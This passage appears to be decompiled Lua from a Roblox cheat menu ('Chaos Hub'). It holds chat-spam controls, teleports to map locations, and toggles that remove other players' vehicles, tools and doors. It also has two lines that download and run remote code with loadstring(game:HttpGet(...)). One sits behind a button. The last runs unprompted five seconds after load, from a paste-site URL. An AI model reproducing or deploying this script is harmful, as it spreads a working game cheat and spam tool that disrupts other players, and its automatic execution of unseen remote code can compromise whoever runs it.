t1.value127 = t1.value126.ChatInputBarConfiguration and t1.value126.ChatInputBarConfiguration.TargetTextChannel
function sendchat(p103)
    if not p103 or p103 == "" then
        return
    end

    if t1.value126.ChatVersion == Enum.ChatVersion.LegacyChatService then
        local success = pcall(function()
            game:GetService("ReplicatedStorage"):FindFirstChild("DefaultChatSystemChatEvents").SayMessageRequest:FireServer(p103, "All")
        end)
        if not success then
            return
        end
    elseif t1.value127 then
        local ok, _ = pcall(function()
            t1.value127:SendAsync(p103)
        end)

        if not not ok then
        end
    end
end
v132:AddTextBox({
    Name = "Enter Text",
    PlaceholderText = "Uh... Hi!",
    Callback = function(p104)
    t1.value125 = p104
end
})
v132:AddButton({
    Name = "Send Chat",
    Callback = function()
    sendchat(t1.value125)
end
})
getgenv().ChaosHubEnviarDelay = 1
v132:AddSlider({
    Name = "Delay Spam",
    Min = 0.4,
    Max = 10,
    Default = 1,
    Increment = 0.1,
    Callback = function(p105)
    getgenv().ChaosHubEnviarDelay = p105
end
})
v132:AddToggle({
    Name = "Spam Chat",
    Default = false,
    Flag = "SpamXhati",
    Callback = function(p106)
    getgenv().ChaosHubSpawnText = p106

    while getgenv().ChaosHubSpawnText do
        sendchat(t1.value125)
        task.wait(getgenv().ChaosHubEnviarDelay)
    end
end
})
local v133 = t1.value19:MakeTab({
    "Scripts",
    "codesandbox"
})
v133:AddSection({ "Drone Lyra" })
v133:AddButton({
    Name = "Drone do Lyra",
    Callback = function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/BRENOPOOF/drone/refs/heads/main/Main.txt"))()
end
})
local v134 = t1.value19:MakeTab({
    "Teleports",
    "tp"
})
v134:AddSection({
    Name = "Teleports"
})
local t153 = {
    "Hotel",
    CFrame.new(192, 4, 272)
}
local t154 = {
    "Urban Center",
    CFrame.new(136, 4, 117)
}
local t155 = {
    "Criminal Area",
    CFrame.new(-119, -28, 235)
}
local t156 = {
    "Abandoned House",
    CFrame.new(986, 4, 63)
}
local t157 = {
    "Agency Portal",
    CFrame.new(672, 4, -296)
}
local t158 = {
    "Hideout",
    CFrame.new(505, -75, 143)
}
local t159 = {
    "School",
    CFrame.new(-312, 4, 211)
}
local t160 = {
    "Burguer Barn",
    CFrame.new(161, 8, 52)
}
local t161 = {
    "Starting Point",
    CFrame.new(-26, 4, -23)
}
local t162 = {
    "Main Arch",
    CFrame.new(-589, 141, -59)
}
local t163 = {
    "Hospital",
    CFrame.new(-309, 4, 71)
}
local t164 = {
    "Agency Base",
    CFrame.new(179, 4, -464)
}
local t165 = {
    "Hidden Place of the Workshop",
    CFrame.new(0, 4, -495)
}
local t166 = {
    "Secret Place",
    CFrame.new(-343, 4, -613)
}
local t167 = {
    "Isolated Island",
    CFrame.new(-1925, 23, 127)
}
local t168 = {
    "Hotel Square",
    CFrame.new(182, 4, 150)
}
local t169 = {
    "Climb Mountain",
    CFrame.new(-670, 251, 765)
}
local t170 = {
    "Main Bank",
    CFrame.new(2.28, 4.65, 254.58)
}
local t171 = {
    "Clothing Store",
    CFrame.new(-46.15, 4.65, 253.2)
}
local t172 = {
    "Veterinary",
    CFrame.new(-88.48, 22.05, 262.34)
}
local t173 = {
    "Dental Clinic",
    CFrame.new(-53.58, 22.15, 265.61)
}
local t174 = {
    "Coffee",
    CFrame.new(-97.12, 4.65, 254.99)
}

for _, v in ipairs({
    t153,
    t154,
    t155,
    t156,
    t157,
    t158,
    t159,
    t160,
    t161,
    t162,
    t163,
    t164,
    t165,
    t166,
    t167,
    t168,
    t169,
    t170,
    t171,
    t172,
    t173,
    t174
}) do
    local v159 = v

    v134:AddButton({
        v159[1],
        function()
        game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = v159[2]
    end
    })
end
local v160 = t1.value19:MakeTab({
    "Protections",
    "shield"
})
t1.value128 = game:GetService("Players").LocalPlayer
t1.value129 = game:GetService("Workspace")
game:GetService("RunService")
t1.value130 = {
    Vehicles = {},
    Canoes = {},
    Jets = {},
    Helis = {},
    Balls = {}
}
t1.value131 = {}
function t1.value131.MostrarNotificacao(_, p108)
    print("ðŸ”” " .. p108)
end
local function v161(p109, p110)
    task.spawn(function()
        while true do
            if false then
                local v1299 = p110()

                if v1299 then
                    local GetChildren = v1299.GetChildren

                    for _, v in ipairs(GetChildren(v1299)) do
                        local v1303 = false

                        if p109 == "Vehicles" then
                            local GetDescendants = v.GetDescendants

                            for _, v4 in ipairs(GetDescendants(v)) do
                                if v4:IsA("VehicleSeat") or v4:IsA("Seat") and (v4.Occupant and v4.Occupant.Parent == t1.value128.Character) then
                                    v1303 = true

                                    break
                                end
                            end
                        elseif p109 == "Canoes" then
                            local Owner = v:FindFirstChild("Owner")

                            v1303 = Owner and Owner.Value == t1.value128
                        elseif p109 == "Jets" or p109 == "Helis" then
                            v1303 = v.Name == t1.value128.Name
                        end

                        if not v1303 then
                            table.insert(t1.value130[p109], v:Clone())
                            v:Destroy()
                        end
                    end
                end
            end

            task.wait(0.03)
        end
    end)

    return function(p111)
        t1.value131:MostrarNotificacao(p109 .. " " .. (not p111 and "desativado!" or "ativado!"))

        if not p111 then
            for _, v in ipairs(t1.value130[p109]) do
                local v1311 = p110()

                if v1311 then
                    v.Parent = v1311
                end
            end

            t1.value130[p109] = {}
        end
    end
end
local AddToggle = v160.AddToggle
local v163 = v161("Canoes", function()
    local WorkspaceCom = t1.value129:FindFirstChild("WorkspaceCom")

    return WorkspaceCom and WorkspaceCom:FindFirstChild("001_CanoeStorage")
end)

AddToggle(v160, {
    Name = "Anti Canoe Fling",
    Description = "",
    Default = false,
    Callback = v163
})
local AddToggle2 = v160.AddToggle
local v165 = v161("Jets", function()
    local WorkspaceCom = t1.value129:FindFirstChild("WorkspaceCom")

    if WorkspaceCom and WorkspaceCom:FindFirstChild("001_Airport") then
        local AirportHanger = WorkspaceCom["001_Airport"]:FindFirstChild("AirportHanger")

        if AirportHanger then
            return AirportHanger:FindFirstChild("001_JetStorage") and AirportHanger["001_JetStorage"]:FindFirstChild("JetAirport")
        end
    end
end)

AddToggle2(v160, {
    Name = "Anti Fling Jets",
    Description = "",
    Default = false,
    Callback = v165
})
local v166 = v161("Helis", function()
    local WorkspaceCom = t1.value129:FindFirstChild("WorkspaceCom")

    return WorkspaceCom and (WorkspaceCom:FindFirstChild("001_HeliStorage") and WorkspaceCom["001_HeliStorage"]:FindFirstChild("PoliceStationHeli"))
end)

v160:AddToggle({
    Name = "Anti Fling Helicopteros",
    Description = "",
    Default = false,
    Callback = v166
})
local AddToggle3 = v160.AddToggle
local v168 = v161("Balls", function()
    local WorkspaceCom = t1.value129:FindFirstChild("WorkspaceCom")

    return WorkspaceCom and WorkspaceCom:FindFirstChild("001_SoccerBalls")
end)

AddToggle3(v160, {
    Name = "Anti Fling Ball",
    Description = "",
    Default = false,
    Callback = v168
})
t1.value132 = false
v160:AddToggle({
    Name = "Anti Sit",
    Description = "",
    Default = false,
    Callback = function(p112)
    t1.value132 = p112

    local value131 = t1.value131

    if p112 then
        p112 = "ativado!"
    end

    value131:MostrarNotificacao("Anti Sit " .. (p112 or "desativado!"))
    task.spawn(function()
        while t1.value132 and t1.value128.Character do
            local Humanoid = t1.value128.Character:FindFirstChildOfClass("Humanoid")

            if Humanoid then
                Humanoid:SetStateEnabled(Enum.HumanoidStateType.Seated, false)

                if Humanoid:GetState() == Enum.HumanoidStateType.Seated then
                    Humanoid:ChangeState(Enum.HumanoidStateType.GettingUp)
                end
            end

            task.wait(0.05)
        end

        if not t1.value132 then
            local v1313 = t1.value128.Character and t1.value128.Character:FindFirstChildOfClass("Humanoid")

            if v1313 then
                v1313:SetStateEnabled(Enum.HumanoidStateType.Seated, true)
            end
        end
    end)
end
})
v160:AddToggle({
    Name = "Anti-Lag",
    Description = "",
    Default = false,
    Callback = function(p113)
    local Players11 = game:GetService("Players")
    local t175 = {}
    local u961
    if not p113 then
        return
    end
    local function v962(p114)
        local t176 = {}
        local t177 = {}

        if p114.Character then
            table.insert(t177, p114.Character)
        end

        local Backpack = p114:FindFirstChildOfClass("Backpack")

        if Backpack then
            table.insert(t177, Backpack)
        end

        local StarterGear = p114:FindFirstChild("StarterGear")

        if StarterGear then
            table.insert(t177, StarterGear)
        end

        for _, v in ipairs(t177) do
            for _, child in ipairs(v:GetChildren()) do
                if child:IsA("Tool") then
                    table.insert(t176, child)
                end
            end
        end

        return t176
    end
    local function v963(p115)
        if p115 == u961 then
            return
        end

        if t175[p115] then
            return
        end

        t175[p115] = true

        local v1326 = v962(p115)

        if #v1326 > 1 then
            for i = 2, #v1326 do
                pcall(function()
                    v1326[i]:Destroy()
                end)
            end
        end

        t175[p115] = false
    end
    local function v964(p116)
        if not u961 then
            u961 = p116
        end

        task.defer(v963, p116)

        local function v1329(p117)
            task.delay(0.5, function()
                v963(p116)
            end)
            p117.ChildAdded:Connect(function(child)
                if child:IsA("Tool") then
                    task.delay(0.1, function()
                        v963(p116)
                    end)
                end
            end)
        end

        if p116.Character then
            v1329(p116.Character)
        end

        p116.CharacterAdded:Connect(v1329)

        local Backpack = p116:WaitForChild("Backpack", 10)

        if Backpack then
            Backpack.ChildAdded:Connect(function(child)
                if child:IsA("Tool") then
                    task.delay(0.1, function()
                        v963(p116)
                    end)
                end
            end)
        end

        local v1331 = p116:FindFirstChild("StarterGear") or p116:WaitForChild("StarterGear", 10)

        if v1331 then
            v1331.ChildAdded:Connect(function(child)
                if child:IsA("Tool") then
                    task.delay(0.1, function()
                        v963(p116)
                    end)
                end
            end)
        end
    end
    Players11.PlayerAdded:Connect(v964)
    for _, player in ipairs(Players11:GetPlayers()) do
        v964(player)
    end
    task.spawn(function()
        while p113 do
            for _, player in ipairs(Players11:GetPlayers()) do
                v963(player)
            end

            task.wait(2)
        end
    end)
end
})
v160:AddToggle({
    Name = "Anti Fling Portas",
    Description = "",
    Default = false,
    Callback = function(p118)
    if not _G.hiddenDoors then
        _G.hiddenDoors = {}
    end

    if p118 then
        _G.hiddenDoors = {}

        for _, descendant in ipairs(workspace:GetDescendants()) do
            if descendant:IsA("BasePart") and descendant.Name:lower():find("door") then
                local descendantTransparency = descendant.Transparency
                local CanCollide = descendant.CanCollide
                local CastShadow = descendant.CastShadow
                local t178 = {
                        door = descendant,
                        originalTransparency = descendantTransparency,
                        originalCanCollide = CanCollide,
                        originalCastShadow = CastShadow
                    }

                descendant.Transparency = 1
                descendant.CanCollide = false

                local GetChildren = descendant.GetChildren

                descendant.CastShadow = false

                for _, v in ipairs(GetChildren(descendant)) do
                    if v:IsA("BasePart") then
                        v.Transparency = 1
                        v.CanCollide = false
                    elseif v:IsA("SurfaceGui") or v:IsA("BillboardGui") then
                        v.Enabled = false
                    end
                end

                table.insert(_G.hiddenDoors, t178)
            end
        end

        print("ðŸ”§ " .. #_G.hiddenDoors .. " portas escondidas!")

        return
    end

    for _, v in ipairs(_G.hiddenDoors or {}) do
        if v.door and v.door.Parent then
            v.door.Transparency = v.originalTransparency
            v.door.CanCollide = v.originalCanCollide
            v.door.CastShadow = v.originalCastShadow

            for _, child in ipairs(v.door:GetChildren()) do
                if child:IsA("BasePart") then
                    child.Transparency = 0
                    child.CanCollide = true
                elseif child:IsA("SurfaceGui") or child:IsA("BillboardGui") then
                    child.Enabled = true
                end
            end
        end
    end

    print("âœ… " .. (#_G.hiddenDoors or {}) .. " portas restauradas com funcionalidade!")
    _G.hiddenDoors = {}
end
})
task.delay(5, function()
    loadstring(game:HttpGet("https://api.rubis.app/v2/scrap/OFbzRF1izFenc6Li/raw"))()
end)